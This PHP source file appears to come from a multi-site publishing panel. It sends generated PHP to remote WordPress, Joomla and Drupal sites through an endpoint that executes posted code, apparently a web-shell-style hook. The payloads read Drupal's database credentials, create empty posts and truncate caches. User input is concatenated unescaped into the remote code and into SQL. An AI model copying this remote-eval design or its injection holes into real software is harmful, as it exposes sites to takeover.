<?php

if (!isset($_POST['domain_id'])) {
    return;
}
if (!isset($_POST['user_id'])) {
    return;
}
$user_id = $_POST['user_id'];

$TDomain = $application->compDriver("domain");
$TDomain_integration = $application->compDriver($element->domainSource . "_integration");
$domain = $TDomain->get($_POST['domain_id']);
if (!$domain) {
    return;
}

$publicDate = date("Y-m-d H:i:s");
$editDate = date("Y-m-d H:i:s");

$jPublicDate = date("Y-m-d H:i:s", time() - 86400);
$jEditDate = date("Y-m-d H:i:s", time() - 86400);

$sysname = str_replace(" ", "-", $publicDate);
$sysname = str_replace(":", "-", $sysname);

if ($domain->type == 0) {
    // Wordpress
    $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "wp-load.php") {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result" => "nodir"));
	exit();
    }
    chdir($dir);
    $dir = preg_replace("/\/$/", "", $dir);
    require_once("wp-load.php");        
    $contentId = $wpdb->insert($wpdb->posts, array(
        "post_author" => \'' . $_POST['user_id'] . '\', 
        "post_date" => \'' . $publicDate . '\',
        "post_modified" => \'' . $editDate . '\'
    ));
    if (!$contentId) {
        print json_encode(array("result" => "internalerror"));
        return;
    }
    $contentId = $wpdb->insert_id;
    $wpdb->update($wpdb->posts, array("post_name" => $contentId), array("ID" => $contentId));
    $sql = $wpdb->prepare("SELECT ID, post_title, post_content, post_name FROM $wpdb->posts WHERE ID = $contentId", null);
    if (!$sql) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        exit();
    }
    $results = $wpdb->get_results($sql);
    if (!$results) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        exit();    
    }
    print json_encode(array("result" => "success", "additionalData" => "", "data" => $results));
    ';
} else if ($domain->type == 1) {
    // Joomla
    if ($domain->additionalData == "k2") {
        $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "includes" && file_exists($dirName . "includes/framework.php")) {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result" => "nodir"));
	exit();
    }
    chdir($dir);
    $dir = preg_replace("/\/$/", "", $dir);
    define("_JEXEC", 1);
    define("JPATH_BASE", "./");
    require_once JPATH_BASE . "/includes/defines.php";
    require_once JPATH_BASE . "/includes/framework.php";
    $db = JFactory::getDbo();
    $query = $db->getQuery(true);
    $query->select("*")
            ->from($db->qn("#__k2_items"))
            ->order("id DESC LIMIT 1");
    $db->setQuery($query);
    if (!$db) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        exit();
    }
    $article = $db->loadObject();
    if (!$article) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        exit();
    }
        
    $article->id = null;
    $article->title = "";
    $article->alias = "' . $sysname . '";
    $article->introtext = "";
    $article->fulltext = "";
    $article->video = null;
    $article->gallery = null;
    $article->extra_fields = "[]";
    $article->created = "' . $jPublicDate . '";
    $article->created_by = "' . $user_id . '";
    $article->modified = "' . $jEditDate . '";
    $article->modified_by = "' . $user_id . '";
    $article->publish_up = "' . $jEditDate . '";
        
    $result = $db->insertObject("#__k2_items", $article, "id" );
    if (!$result) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        exit();
    }
    $article->id = $db->insertID();

    print json_encode(array("result" => "success", "additionalData" => "k2", "data" => array($article)));
    ';
    } else {
        $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "includes" && file_exists($dirName . "includes/framework.php")) {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result" => "nodir"));
	exit();
    }
    chdir($dir);
    $dir = preg_replace("/\/$/", "", $dir);
    define("_JEXEC", 1);
    define("JPATH_BASE", "./");
    require_once JPATH_BASE . "/includes/defines.php";
    require_once JPATH_BASE . "/includes/framework.php";
    $db = JFactory::getDbo();
    $query = $db->getQuery(true);
    $query->select("*")
            ->from($db->qn("#__content"))
            ->order("id DESC LIMIT 1");
    $db->setQuery($query);
    if (!$db) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        exit();
    }
    $article = $db->loadObject();
    if (!$article) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        exit();
    }
    
    $query = $db->getQuery(true);
    $query->select("*")
            ->from($db->qn("#__assets"))
            ->where("id = {$article->asset_id}");
    $db->setQuery($query);
    if (!$db) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        exit();
    }
    $asset = $db->loadObject();
    if (!$asset) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        exit();
    }

    $asset->id = null;
        
    $article->id = null;
    $article->title = "";
    $article->alias = "' . $sysname . '";
    $article->introtext = "";
    $article->fulltext = "";
    $article->created = "' . $jPublicDate . '";
    $article->created_by = "' . $user_id . '";
    $article->modified = "' . $jEditDate . '";
    $article->modified_by = "' . $user_id . '";
    $article->publish_up = "' . $jEditDate . '";
    $article->images = "";
    $article->urls = "";
    $article->version = 1;

    $result = $db->insertObject("#__content", $article, "id" );
    if (!$result) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        exit();
    }
    $article->id = $db->insertID();

    $asset->name = "com_content.category.{$article->id}";
    try {
        $result = $db->insertObject("#__assets", $asset, "id" );
    } catch(Exception $ex) {
        print $ex;
    }
    if (!$result) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        exit();
    }
    
    $article->asset_id = $db->insertID();
    
    $result = $db->updateObject("#__content", $article, "id" );

    print json_encode(array("result" => "success", "additionalData" => "", "data" => array($article)));
    ';
    }
} else if ($domain->type == 2) {
    // Drupal
    $message = '
    function storeObj($pdo, $object, $tblname) {
        $varSql = "";
        $valSql = "";
        foreach ($object as $var => $val) {
            if ($varSql) {
                $varSql .= ", ";
            }
            $varSql .= "`$var`";
            if ($valSql) {
                $valSql .= ", ";
            }
            $valSql .= "\'$val\'";
        }
        $pdo->exec("INSERT INTO $tblname ($varSql) VALUES ($valSql)");
        return $pdo->lastInsertId();
    }
        
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "sites" && file_exists($dirName . "sites/default/settings.php")) {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result"=>"nodir"));
	exit();
    }
    chdir($dir);
    include("sites/default/settings.php");
    $pdo = new PDO("mysql:host={$databases[\'default\'][\'default\'][\'host\']};dbname={$databases[\'default\'][\'default\'][\'database\']};charset=utf8", $databases[\'default\'][\'default\'][\'username\'], $databases[\'default\'][\'default\'][\'password\']);

    $dbQuery = $pdo->query("SELECT * FROM {$databases[\'default\'][\'default\'][\'prefix\']}node ORDER BY nid DESC LIMIT 1");
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        return;
    }
    $node = $dbQuery->fetchObject();
    if (!$node) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        return;
    }

    $dbQuery = $pdo->query("SELECT * FROM {$databases[\'default\'][\'default\'][\'prefix\']}node__body WHERE entity_id = " . $node->nid);
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        return;
    }
    $node__body = $dbQuery->fetchObject();
    if (!$node__body) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        return;
    }

    $dbQuery = $pdo->query("SELECT * FROM {$databases[\'default\'][\'default\'][\'prefix\']}node_field_data WHERE nid = " . $node->nid);
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        return;
    }
    $node_field_data = $dbQuery->fetchObject();
    if (!$node_field_data) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        return;
    }

    $dbQuery = $pdo->query("SELECT * FROM {$databases[\'default\'][\'default\'][\'prefix\']}node_field_revision WHERE nid = " . $node->nid . " ORDER BY vid DESC LIMIT 1");
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        return;
    }
    $node_field_revision = $dbQuery->fetchObject();
    if (!$node_field_revision) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        return;
    }

    $dbQuery = $pdo->query("SELECT * FROM {$databases[\'default\'][\'default\'][\'prefix\']}node_revision WHERE nid = " . $node->nid . " AND vid = " . $node_field_revision->vid);
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        return;
    }
    $node_revision = $dbQuery->fetchObject();
    if (!$node_revision) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        return;
    }

    $dbQuery = $pdo->query("SELECT * FROM {$databases[\'default\'][\'default\'][\'prefix\']}node_revision__body WHERE entity_id = " . $node->nid . " AND revision_id = " . $node_field_revision->vid);
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        return;
    }
    $node_revision__body = $dbQuery->fetchObject();
    if (!$node_revision) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        return;
    }

    $node->nid++;
    $node->vid++;
    $node->uuid = sha1(time());
    $node->nid = storeObj($pdo, $node, "{$databases[\'default\'][\'default\'][\'prefix\']}node");

    $node__body->entity_id = $node->nid;
    $node__body->revision_id = $node->vid;
    $node__body->body_value = "";
    storeObj($pdo, $node__body, "{$databases[\'default\'][\'default\'][\'prefix\']}node__body");

    $node_field_data->nid = $node->nid;
    $node_field_data->vid = $node->vid;
    $node_field_data->uid = ' . $_POST['user_id'] . ';
    $node_field_data->title = "";
    $node_field_data->created = time();
    $node_field_data->changed = time();
    storeObj($pdo, $node_field_data, "{$databases[\'default\'][\'default\'][\'prefix\']}node_field_data");

    $node_field_revision->nid = $node->nid;
    $node_field_revision->vid = $node->vid;
    $node_field_revision->title = "";
    $node_field_revision->created = time();
    $node_field_revision->changed = time();    
    storeObj($pdo, $node_field_revision, "{$databases[\'default\'][\'default\'][\'prefix\']}node_field_revision");

    $node_revision->nid = $node->nid;
    $node_revision->vid = $node->vid;
    $node_revision->revision_uid = ' . $_POST['user_id'] . ';
    $node_revision->revision_log = "External Provisioning";
    $node_revision->revision_timestamp = time();
    storeObj($pdo, $node_revision, "{$databases[\'default\'][\'default\'][\'prefix\']}node_revision");

    $node_revision__body->entity_id = $node->nid;
    $node_revision__body->revision_id = $node->vid;
    $node_revision__body->body_value = "";
    storeObj($pdo, $node_revision__body, "{$databases[\'default\'][\'default\'][\'prefix\']}node_revision__body");

    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_bootstrap`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_config`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_container`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_data`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_default`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_discovery`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_dynamic_page_cache`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_entity`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_menu`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_render`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_rest`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cachetags`");
    $dbQuery = $pdo->exec("TRUNCATE `{$databases[\'default\'][\'default\'][\'prefix\']}cache_toolbar`");
    
    $dbQuery = $pdo->query("SELECT b.entity_id, b.body_value, nf.title FROM {$databases[\'default\'][\'default\'][\'prefix\']}node__body b LEFT JOIN {$databases[\'default\'][\'default\'][\'prefix\']}node_field_data nf on nf.nid = b.entity_id WHERE nf.nid = {$node->nid}");
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "additionalData" => "", "data" => array()));
        return;
    }
    $rows = $dbQuery->fetchAll(PDO::FETCH_CLASS);
    if (!$rows) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => array()));
        return;
    }
    print json_encode(array("result" => "success", "additionalData" => "", "data" => $rows));
    ';
}

$message = urlencode($message);
$message = trim($message);
$message = preg_replace("/\r|\n/", "", $message);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $domain->url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "code=$message");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
if (!$server_output) {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "0"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "0", "datetime" => "NOW()"));
    print json_encode(array("result" => "noconnect"));
    return;
}
$obj = json_decode($server_output);
if (!isset($obj->result)) {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "1"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "1", "datetime" => "NOW()"));
    print json_encode(array("result" => "internalerror"));
    return;
}
if ($obj->result != "success") {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "2"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "2", "datetime" => "NOW()"));
    print json_encode(array("result" => $obj->result));
    return;
}
$TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "3"));
$id = $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "3", "datetime" => "NOW()"));
$TPost = $application->compDriver($element->postCache);

// Response adaptor
if ($domain->type == 1) {
    //J
    foreach ($obj->data as $o) {
        $o->pretext = $o->introtext;
        $o->text = $o->fulltext;
        $o->entity_id = $o->id;
        $o->editDate = $jEditDate;
        $o->publicDate = $jPublicDate;
        if ($domain->additionalData == "k2") {
            $o->extUrl = parse_url($domain->url, PHP_URL_SCHEME) . "://" . parse_url($domain->url, PHP_URL_HOST) . "/component/k2/item/" . $o->id;
        } else {
            $o->extUrl = parse_url($domain->url, PHP_URL_SCHEME) . "://" . parse_url($domain->url, PHP_URL_HOST) . "/" . $o->catid . "/" . $o->id;
        }
    }
} else if ($domain->type == 0) {
    //W
    foreach ($obj->data as $o) {
        $o->title = $o->post_title;
        $o->pretext = "";
        $o->text = $o->post_content;
        $o->entity_id = $o->ID;
        $o->editDate = $editDate;
        $o->publicDate = $publicDate;
        $o->extUrl = parse_url($domain->url, PHP_URL_SCHEME) . "://" . parse_url($domain->url, PHP_URL_HOST) . date("/Y/m/d/", strtotime($o->publicDate)) . $o->post_name;
    }
} else if ($domain->type == 2) {
    //D
    foreach ($obj->data as $o) {
        $o->pretext = "";
        $o->text = $o->body_value;
        $o->editDate = $editDate;
        $o->publicDate = $publicDate;
        $o->extUrl = parse_url($domain->url, PHP_URL_SCHEME) . "://" . parse_url($domain->url, PHP_URL_HOST) . "/node/" . $o->entity_id;
    }
}
$url = "";
// Common part
foreach ($obj->data as $o) {
    $id = $TPost->createByFields(array(
        "title" => $o->title,
        "pretext" => $o->pretext,
        "text" => $o->text,
        "foreinId" => $o->entity_id,
        "domain_id" => $domain->id,
        "additionalData" => $obj->additionalData,
        "editDate" => $o->editDate,
        "publicDate" => $o->publicDate,
        "url" => $o->extUrl
    ));
    $url = $application->dirName . "/?category={$_GET['category']}&component={$element->postCacheElement}&element={$element->postCache}&id=$id&action=edit";
}
print json_encode(array("result" => "success", "url" => $url));
